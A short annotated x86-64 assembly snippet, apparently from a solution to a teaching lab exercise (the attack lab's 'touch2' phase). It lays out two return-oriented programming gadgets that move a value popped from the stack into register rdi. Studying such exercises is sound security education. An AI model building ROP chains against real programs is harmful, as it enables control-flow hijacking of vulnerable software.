  popq %rax          # 1st gadget, pop the stack value and store to register rax
  retq               # correctly set stack value heading to 2nd gadget
  movq %rax, %rdi    # 2nd gadget, copy value from register rax to rdi
  retq               # correctly set stack value heading to <touch2>
